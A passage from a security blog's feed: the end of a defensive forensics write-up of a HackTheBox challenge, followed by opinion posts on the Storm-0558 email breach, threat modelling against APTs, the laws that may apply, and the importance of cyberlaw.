style="margin-top: 5px;"> Fig. 40 </div> <h2 id="task-15-when-was-the-scheduled-task-created-provide-the-timestamp-in-utc">Task 15: When was the scheduled task created? Provide the timestamp in UTC.</h2> <p>This is the same timestamp we checked in the previous task. Remember that your system might not show the correct timezone, so convert to UTC (+4 hours for me) to get <code class="language-plaintext highlighter-rouge">2024-03-19 19:24:05</code>.</p> <h2 id="task-16-upon-concluding-the-intrusion-the-attacker-left-behind-a-specific-file-on-the-compromised-host-what-is-the-name-of-this-file">Task 16: Upon concluding the intrusion, the attacker left behind a specific file on the compromised host. What is the name of this file?</h2> <p>I already found this file while searching for the <code class="language-plaintext highlighter-rouge">uninstall.exe</code> hash in <a href="#task9">Task 9</a>. It was originally named <code class="language-plaintext highlighter-rouge">file.txt</code></p> <h2 id="task-17-as-an-anti-forensics-measure-the-threat-actor-changed-the-file-name-after-executing-it-what-is-the-new-file-name">Task 17: As an anti-forensics measure. The threat actor changed the file name after executing it. What is the new file name?</h2> <p>Again, see <a href="#task9">Task 9</a> for details. It was renamed to <code class="language-plaintext highlighter-rouge">updater.exe</code> and it is located at <code class="language-plaintext highlighter-rouge">C/ProgramData/updater.exe</code>.</p> <h2 id="task-18-identify-the-malware-family-associated-with-the-file-mentioned-in-the-previous-question-17">Task 18: Identify the malware family associated with the file mentioned in the previous question (17).</h2> <p>I hashed the file and searched it on VT (Fig. 41). Its family labels on VT are not the answer to this question (though the answer does exist somewhere in one of its VT tabs).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/41.png" sizes="95vw"/> <img src="/assets/img/nuts/41.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 41 </div> <p>Googling the hash returned nothing for me, but searching it on Duck-Duck-Go returned a <a href="https://www.joesandbox.com/analysis/1275269/0/html">JoeSandbox report</a> containing its malware family name in the <em>Tags</em> field.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/42.png" sizes="95vw"/> <img src="/assets/img/nuts/42.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 42 </div> <h2 id="task-19-when-was-the-file-dropped-onto-the-system-provide-the-timestamp-in-utc">Task 19: When was the file dropped onto the system? Provide the timestamp in UTC.</h2> <p>This question is referring to <code class="language-plaintext highlighter-rouge">updater.exe</code> again. I headed back to the USN Journal to see the entry for when <code class="language-plaintext highlighter-rouge">file.exe</code> was created (Fig. 43).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/43.png" sizes="95vw"/> <img src="/assets/img/nuts/43.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 43 </div> <h2 id="conclusion">Conclusion</h2> <p>I really enjoyed completing this Sherlock. I thought it maintained a good balance between approachability and complexity. Nothing felt too out of reach, but there were times that I made mistakes and went down rabbit holes that were unnecessary. My biggest takeaway is that I need to keep an eye out for UTF-16 encoded text/log files on Windows images and not fully rely on vanilla grep to find things in files for me.</p> <p>It was also cool to be able to “pull back the curtain” on the CTF and see that Sysmon logs had existed but were not deleted by the attacker, leading to the conclusion that they were not included on the image on purpose to make the challenge a bit harder.</p> <p>Thanks for reading! If you have any questions or comments, feel free to reach out or follow <a href="https://x.com/its_rad_io">me on X</a></p>]]></content><author><name></name></author><category term="Write-Ups"/><category term="forensics"/><category term="medium"/><category term="sherlock"/><category term="HackTheBox"/><summary type="html"><![CDATA[A write-up for Hack The Box's forensics challenge 'Nuts'. This challenge focuses primarily on file forensics, with the evidence consisting solely of a forensic image of a targetted filesystem.]]></summary></entry><entry><title type="html">How Chinese Spies Hacked U.S. State Department Emails–Threat Modeling for APTs and APTaaS</title><link href="https://its-radio.github.io/blog/2024/storm-0558-APT/" rel="alternate" type="text/html" title="How Chinese Spies Hacked U.S. State Department Emails–Threat Modeling for APTs and APTaaS"/><published>2024-07-12T00:00:00+00:00</published><updated>2024-07-12T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/storm-0558-APT</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/storm-0558-APT/"><![CDATA[<p><strong>Note:</strong> <em>I refer to a threat group as “Storm-0558” throughout this article, but since the time of writing Microsoft has begun tracking this group under the name “Antique Typhoon”</em></p> <h2 id="how-chinese-spies-hacked-us-state-department-emails">How Chinese Spies Hacked U.S. State Department Emails</h2> <p>An intrusion by an APT (Advanced Persistent Threat) that I recently researched for a class stood out from other APT attacks I have heard of. It caught my eye due to its complexity and the ingenuity it must have taken to pull off successfully. The attack was discovered in the summer of 2023, first by the US State Department, and then more thoroughly investigated by Microsoft. I wrote <a href="/blog/2024/storm-0558-laws/">another blog post</a> about this attack and the U.S. laws that were broken by both the threat actors and by Microsoft. Microsoft was tipped off that Outlook email accounts belonging to US State Department employees and contractors were being accessed by unknown parties. Microsoft investigated and found that the patterns of activity displayed by the group were consistent with an APT conducting espionage from China. This group’s activities were distinct from previously known Chinese government APTs, so Microsoft classified the group as a developing APT and named it Storm-0558.</p> <p>Storm-0558’s patterns of activity fit neatly with many of those outlined in Hejase et al.’s 2020 review of APTs. Hejase et al. suggest that APTs may be able to successfully target and penetrate even well-resourced and well-defended organizations <a class="citation" href="#hejase_advanced_2020">(Hejase et al., 2020)</a>. Indeed, Storm-0558 penetrated Microsoft’s flagship email product <em>Outlook</em> as well as Microsoft’s corporate network. Furthermore, the attack was aimed at a razor thin set of targets–the US State Department and companies closely related to it. The attackers were highly skilled, remaining undetected in Microsoft’s systems for at least a month but possibly as long as a year or more. They achieved this by abusing an unknown flaw–a 0-day–but not a standard one. It required a special cryptographic key that had to be stolen from Microsoft. Not only that, but Microsoft didn’t even know they, themselves, had the key or that it could be stolen. It was not ever supposed to be stored on their servers, but was accidentally saved (because of a bug) as part of a crash-dump after the crash of a system that was used to generate MSA signing keys. The attackers had to know that they needed the key, know how to look for the key, compromise a Microsoft employee account, know the key would be in the crash-dump, find the crash-dump, exfiltrate it, find the key, and then use it as part of a 0-day exploit for the attack, all without detection. This is all to say that this attack took tremendous skill, time, and dedication to pull off and aligns with Hejase et al.’s descriptions of APT attacks <a class="citation" href="#hejase_advanced_2020">(Hejase et al., 2020)</a>.</p> <h2 id="using-threat-modeling-to-defend-against-apts">Using Threat Modeling To Defend Against APTs</h2> <p>A single section of blog post is much too small to cover how to defend against APTs but I will touch on some important points that I came across during my research. Given the resources and manpower at their disposal, defense against APTs can be extremely challenging. There will never be a perfect defense strategy. In their article on using Game-Theory to identify defense strategies for use against APTs, Khalid et al. echo this sentiment, writing that in the future we will continue to see attackers’ behavior evolve to avoid detection and bypass security measures <a class="citation" href="#khalid_recent_2023">(Khalid et al., 2023)</a>. This may seem like an obvious statement but it is especially poignant when it comes to APTs. APTs, especially large government APTs, are often on the cutting-edge of technological progress. In some cases, like the case of Microsoft and Storm-0558, they will penetrate even very well-resourced organizations.</p> <p>To defend against attackers who use novel and advanced tactics, we must try to anticipate these novel tactics before they are used by thinking about how an advanced attacker <em>might try</em> to breach our defenses. This is where Threat Modeling can help. Tatam et al. highlight eight key aspects of a threat modeling exercise <a class="citation" href="#tatam_review_2021">(Tatam et al., 2021)</a>:</p> <p><em>1. Use correlated and actionable threat intelligence from multiple internal and external sources.</em> <em>2. Identify organizational specific threat agents, their motives and capability.</em> <em>3. Identify critical assets and controls.</em> <em>4. Find all relevant threats whose likelihood and business impact level are above the organization’s risk appetite.</em> <em>5. Include as many stakeholders as possible from all areas and levels of an organization.</em> <em>6. Identify boundaries of environments within the scope of the system.</em> <em>7. Identify Authentication and authorisation aspects.</em> <em>8. Choose a consistent approach and methodology that best fits requirements, maturity level, audience and environment.</em></p> <p>Applying these principles can help identify possible vectors of attack, likely targets for attack, and so on. In the case of Microsoft and Storm-0558, while I’m sure Microsoft applies many of these principles, Microsoft failed to model a threat like Storm-0558. They failed to identify the crash-dump as a critical asset (since it contained critical information). They failed to detect that the crash-dump contained a cryptographic key, leading to the failure to protect it. Their failure to detect and protect the key led to the eventual breach by Storm-0558. If their threat modeling had included thorough searches for MSA keys in places they shouldn’t be, its possible they would be been able to prevent the breach. This example illustrates two realities: That threat modeling, if applied properly, can help increase security at any organization, even very large ones. And that APTs may still find methods of exploitation that have not occurred to defenders, even when threat modeling has been done well.</p> <h2 id="inexperienced-nation-states-playing-catch-up">Inexperienced Nation-States Playing Catch-Up</h2> <p>APT status, at least at the highest tier, is generally reserved for governments or other organizations with a long history of signals intelligence like the U.S., China, India, U.K., etc. These countries have been pouring resources into cyber espionage for years and have used that time and experience to develop many advanced capabilities. While money can be a great catalyst for the development of espionage capabilities, the key components are really time and experience. Organizations like the NSA have spent decades trying, succeeding, failing, and iterating their technologies. There is simply no way for another country to buy that experience. In the past, this has acted as a barrier to entry for countries trying to enter the playing field. However, that paradigm is unquestionably shifting.</p> <p>Increasingly since the mid 2010s, nation-states have been able to buy their way to higher and higher tiers of the APT class. It all started with a U.S. company called Zorodium, founded in 2015. Zorodium acted as a broker for exploits, buying them from hackers and selling them to governments, their contractors, or other private companies. Since 2015, many other such brokers have popped up, funneling exploits from hackers around the world into the hands of the highest bidders. This phenomenon also gave rise to a similar, but distinct business model: APTaaS or APT as a Service. These companies offer a full service hacking suite to governments in exchange for a heft payout. Israel’s NSO Group is perhaps the most famous (and infamous) of these organizations.</p> <p>Companies like NSO develop advanced hacking tools and frameworks and then sell them to governments or other organizations that do not have the experience or ability to develop such tools on their own. It used to take years or decades to stand-up an organization competent enough to pose a significant threat as a nation-state, but thanks to APTaaS, the timeline is now much shorter. What this means is that there has been a recent proliferation of advanced cyber-weapons to many governments across the world, vastly expanding the breadth of the potential threat posed by APTs as a whole. The United States and China, among many others, have long been guilty of (ab)using their cyber-might for their own gain, often at the expense of others. With advanced cyber weapons in the hands of more nation states than ever before, these threats are multiplied many fold. While it used to be rare to be the target of an APT, it is becoming more and more common. The idea “it won’t happen to me,” which was outdated as soon as it was uttered, is especially egregious in the age of APTaaS. Today all organizations, and really all privacy-minded individuals, must assume that they could be the victim of a long-term, targeted, and advanced attack.</p>]]></content><author><name></name></author><category term="Opinion"/><category term="breach"/><category term="opinion"/><category term="china"/><category term="storm0558"/><category term="antiquetyphoon"/><category term="apt"/><summary type="html"><![CDATA[An informal discussion of Antique Typhoon's attack on Microsoft systems and email accounts associated with U.S Government personnel. A brief discussion of threat modelling and APTaaS.]]></summary></entry><entry><title type="html">The Legal Implications of Antique Typhoon’s Intrustion Into Microsoft &amp;amp; The U.S. State Department</title><link href="https://its-radio.github.io/blog/2024/storm-0558-laws/" rel="alternate" type="text/html" title="The Legal Implications of Antique Typhoon’s Intrustion Into Microsoft &amp;amp; The U.S. State Department"/><published>2024-06-21T00:00:00+00:00</published><updated>2024-06-21T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/storm-0558-laws</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/storm-0558-laws/"><![CDATA[<p><strong>Disclaimer:</strong> <em>While I discuss U.S. laws in this article, I am not a lawyer and anything I write about law (or anything else for that matter) should be taken as my opinion and speculation, not as a statement of legal fact. Certainly nothing I write should be taken as legal advice.</em></p> <p><strong>Note:</strong> <em>I refer to a threat group as “Storm-0558” throughout this article, but since the time of writing Microsoft has begun tracking this group under the name “Antique Typhoon”</em></p> <h2 id="the-attack-and-initial-fallout">The attack and initial fallout</h2> <p>On July 11th, 2023, the Microsoft Security Response Center (MSRC) published a blog post announcing that they had mitigated an attack targeting Microsoft Cloud email accounts at 25 organizations across the world <a class="citation" href="#msrc_microsoft_2023a">(MSRC, 2023)</a>. Specifically, the attackers had seemed quite interested in U.S. government activity, targeting U.S. government agencies and adjacent organizations. Among the accounts hacked were those of U.S. Commerce Secretary Gina Raimondo, Assistant Secretary of State for East Asia Daniel Kritenbrink, and U.S. Envoy to China Nicholas Burns <a class="citation" href="#freed_chinese_2023">(Freed et al., 2023)</a>.</p> <p>Microsoft Threat Intelligence has said that the attacking group is based in China and assessed that its methods, OpSec, tradecraft, and objectives seem consistent with state-sponsored espionage <a class="citation" href="#mti_analysis_2023">(Intelligence, 2023)</a>. They have dubbed the group <em>Storm-0558</em> and differentiated it from previously identified Chinese state-sponsored hacking groups like APT31, APT41, APT10, and Salt Typhoon. Storm-0558 gained access to accounts by forging authentication tokens and using them via the Outlook Web Access web application <a class="citation" href="#msrc_microsoft_2023a">(MSRC, 2023)</a>. The precise details are a little murky even in Microsoft’s own posts about the attack, but the exploit used by the attackers required use of a Microsoft account (MSA) key that they had obtained by compromising a Microsoft employee’s account in a phishing campaign. The MSA key in question was never supposed to be saved by Microsoft but was accidentally included in a crash-dump log back in 2021 <a class="citation" href="#msrc_results_2023b">(MSRC, 2023)</a>. The stolen MSA key was then somehow accessed by the attackers and used to cryptographically sign Azure Active Directory authentication tokens that allowed access to enterprise email accounts. The attackers accessed select accounts for more than a month in 2023 and exfiltrated over 60,000 emails during that time. U.S. sources say that none of the emails contained classified or even sensitive information.</p> <p><strong>Update:</strong> <em>If you’d like to know more about the actual attack, I hace since written another <a href="/blog/2024/storm-0558-APT/">post on the topic</a>. I’d also highly recommend reading the detailed reports from MSRC, which you can find in my references.</em></p> <p>As of today, no official criminal proceedings have been brought as a result of this attack. Given the international nature of the attack and the fact that the attackers were probably working for Chinese intelligence, it is unlikely that any of the hackers will serve time or face consequences for this breach. However, these types of hurdles have not stopped the U.S. Department of Justice (DOJ) from issuing indictments against state-sponsored hackers in the past.</p> <h2 id="which-laws-were-broken-by-storm-0558">Which Laws Were Broken By Storm-0558?</h2> <p>It is obvious that it is illegal to hack into a large corporation and then leverage that access to read State Department employee’s emails, but it is less obvious exactly which laws make those actions are illegal. To get an idea of which laws could apply to this case, I researched some idictments issued for similar cases.</p> <p>One similar case, in 2017, the DOJ released indictments for four Russian nationals associated with the FSB (the domestic wing of Russian Intelligence) for allegedly hacking Yahoo email accounts <a class="citation" href="#doj_office_2017">(DOJ, 2017)</a>. The 2017 case differs in many ways from Storm-0558’s 2023 attack, but some of the charges in the indictment seem like they could be applied to the members of Storm-0558. For example, it seems likely that the members of Storm-0558 violated <em>18 USC §1030. Fraud and related activity in connection with computers</em> which contains many specific criteria for violation, but in essence prohibits unauthorized access to any protected computers, including those containing information from any department of the United States <a class="citation" href="#18_usc_1030_1986">(18 USC §1030, 1986)</a>. They also probably violated <em>18 USC §1028. Fraud and related activity in connection with identification documents, authentication features, and information</em> <a class="citation" href="#18_usc_1028_1998">(18 USC §1028, 1998)</a>, <em>18 USC §1028A. Aggravated identity theft</em> <a class="citation" href="#18_usc_1028A_2004">(18 USC §1028A, 2004)</a>, and <em>18 USC §1029. Fraud and related activity in connection with access devices</em> <a class="citation" href="#18_usc_1029_1984">(18 USC §1029, 1984)</a>. The reasons that I believe they violated these laws are, respectively, because they forged authentication tokens to impersonate another person, they committed a felony while impersonating another person, and they created, possessed, and used “counterfeit” authentication tokens, i.e. access devices.</p> <h2 id="could-microsoft-be-under-legal-threat-too">Could Microsoft Be Under Legal Threat Too?</h2> <p>U.S. Senator Ron Wyden <a class="citation" href="#wyden_letter_2023">(Wyden, 2023)</a> wrote a letter to Jen Easterly, Director of CISA, Lina Khan, Chairwoman of the FTC, and Merrick Garland, U.S. Attorney General asking them to investigate Microsoft in relation to the email breach. He specifically asks Garland to determine if Microsoft broke federal contract laws, Khan to investigate privacy laws, and points out that by being negligent in this case Microsoft may have broken a court order from 2002 regarding a different security incident. Wyden doesn’t specify laws that he thinks Microsoft has broken, but I think some contenders are <em>The Federal Trade Commission Act</em> <a class="citation" href="#15_usc_41-58_1914">(15 USC §41-58, 1914)</a>, <em>The Children’s Online Privacy Protection Act</em> <a class="citation" href="#15_usc_6501-6505_1998">(15 USC §6501-6505, 1998)</a>, and <em>The Electronic Communications Privacy Act</em> <a class="citation" href="#18_usc_2510-2523_1986">(18 USC §2510-2523, 1986)</a>.</p> <p>To make matters worse for Microsoft, they weren’t even the ones who discovered the attack, instead they were notified by the U.S. State Department’s cybersecurity team <a class="citation" href="#goswami_microsoft_2023">(Goswami, 2023)</a>. Furthermore, Microsoft was charging a premium fee for access to the types of logs that allowed the State Department’s team to notice the attack. Customers who paid for the cloud email services, but not for the premium logging, had absolutely no way to know they were under attack. After looking through logs of one of the victim organizations that did not pay Microsoft for premium logs, Incident responder Steven Adair said in an interview “you couldn’t convince me anything in here is out of the ordinary and I would never suspect a breach and I’m looking for one” <a class="citation" href="#temple-raston_what_2023">(Temple-Raston &amp; Jarvis, 2023)</a>. All this is to say, Microsoft may be in some legal trouble after this incident. Between leaking the MSA key, not being able to detect the breach themselves, and charging a premium for access to the logs that contained evidence of the breach, they are already appearing pretty weak, at least in the court of public opinion</p>]]></content><author><name></name></author><category term="Opinion"/><category term="law"/><category term="cyberlaw"/><category term="opinion"/><category term="china"/><category term="storm0558"/><category term="antiquetyphoon"/><category term="apt"/><summary type="html"><![CDATA[An informal discussion of Antique Typhoon's attack on Microsoft systems and email accounts associated with U.S State Department employees as well as the laws that were likely broken along the way.]]></summary></entry><entry><title type="html">Why All The Cybersecurity Laws? Why Now?</title><link href="https://its-radio.github.io/blog/2024/importance-of-cyberlaw/" rel="alternate" type="text/html" title="Why All The Cybersecurity Laws? Why Now?"/><published>2024-05-15T00:00:00+00:00</published><updated>2024-05-15T00:00:00+00:00</updated><id>https://its-radio.github.io/blog/2024/importance-of-cyberlaw</id><content type="html" xml:base="https://its-radio.github.io/blog/2024/importance-of-cyberlaw/"><![CDATA[<p>Cyberlaw has become increasingly important since the advent of the internet. As Duggal <a class="citation" href="#duggal_future_2016">(Duggal, 2016)</a> aptly points out, at the beginning, the internet was like the Wild West–no laws, no limits, and no sheriff in town to keep bandits at bay. However, in the early days of internet-like entities in the 1960s and 1970s, there really wasn’t much interesting or valuable on the internet to steal. So it was like the wild west, but without trains to commandeer, stage coaches to hold up, or banks to rob. There were no laws, no law enforcement, but not much need for either.</p> <p>Over the years, the proverbial trains, stage coaches, and banks arrived on the internet. As nefarious activities began to become a problem, governments tried to address the issues with legislation, but they were already lagging behind. There have been many attempts to create and enforce laws to govern activities that occur online or on a computer. In the fairly early days, the US passed The Computer Fraud and Abuse Act of 1986 <a class="citation" href="#hughes_hr4718_1986">(Hughes, 1986)</a> and The Computer Security Act of 1987 <a class="citation" href="#glickman_hr145_1988">(Glickman, 1988)</a>. Other countries followed suit with the UK passing The Computer Misuse Act of 1990 <a class="citation" href="#townsend_brief_2019">(Townsend, 2019)</a> and India enacting The Information Technology Act of 2000 <a class="citation" href="#nagpal_7_2007">(Nagpal, 2007)</a>. As is true with all laws, these only applied to the countries in which they were passed. The result is a disparate smattering of laws across the globe, each one only governing a small geographic area while attempting to govern a global network.</p> <p>By 2016, attackers were maturing. Nation states had begun to seriously employ hacking to further their political goals and intelligence objectives. Criminals were becoming more skilled and more organized. Governments and law enforcement agencies made some attempts to curb cybercrime by working with the governments of other countries. Many countries began engaging others in bilateral cyber-arrangements <a class="citation" href="#duggal_future_2016">(Duggal, 2016)</a>–kind of agreeing with each other, “I won’t hack you if you don’t hack me.” Other countries, though, decided not to participate in these types of agreements. Famously, Russia’s refusal to prosecute organized criminal groups that targeted citizens of western countries has led to an unprecedented explosion of cybercrime. Without fear of prosecution, criminal cyber-gangs were able to essentially operate as legal businesses in Russia which resulted in a streamlining and professionalization of their criminal activities.</p> <p>Now, in 2024, the trend has continued. Threat actors are at the most mature and dangerous we’ve yet seen them, legal frameworks remain two steps behind, and the “west” remains pretty wild. However, progress is being made. Beyond writing legislation that creates consequences for those actively engaged in cyber crime, lawmakers have increasingly instated requirements for companies that store sensitive data. By legally requiring companies to follow certain cybersecurity practices, lawmakers aim to lower the criminals’ rates of success. At the end of 2023, for example, the Securities and Exchange Commission implemented a new rule that forces registrants to disclose serious cybersecurity incidents within 4 days <a class="citation" href="#zukis_companies_nodate">(Zukis, 2024)</a> (Zukis, 2024). Shafer and Vecci <a class="citation" href="#shafer_cybersecurity_2023">(Shafer &amp; Vecci, 2023)</a> tell an interesting story about a ransomware incident that highlights both the importance and a shortcoming of such a requirement. In the incident, a company was being extorted by a ransomware gang. The company failed to disclose the breach to the SEC. The gang, being aware of the SEC’s requirements, then threatened that they would report the company’s failure to disclose to the SEC. The company put itself in a terrible strategic position by not reporting the breach, but it’s also true that the SEC’s rule inadvertently supplied the ransomware gang with extra leverage.</p> <p>Personally, I think that reporting rules are good. I think most compliance requirements are good. I think that most companies do far too little to protect themselves from cyberattacks, and compliance requirements can help motivate them to do more. Our lives are more online than ever before, companies store more of our personal information than ever before, and cybercrime continues to become more professional and profitable. These factors combine to mean that now is perhaps the most important moment in history for cyber law. That being said, it’s not all doom and gloom. For the past couple of years, the UN has been drafting and negotiating an international treaty on cybercrime <a class="citation" href="#wilkinson_what_2023">(Wilkinson, 2023)</a>. With some luck maybe this treaty will help governments work together to reduce cybercrime rates in a concerted effort across the globe. Maybe. Until that far-off future comes, the internet will remain what it has been since the beginning: The Wild West.</p>]]></content><author><name></name></author><category term="Opinion"/><category term="law"/><category term="cyberlaw"/><category term="opinion"/><summary type="html"><![CDATA[A short piece I wrote for a Cyberlaw class on the importance of cybersecurity laws in the modern day.]]></summary></entry></feed>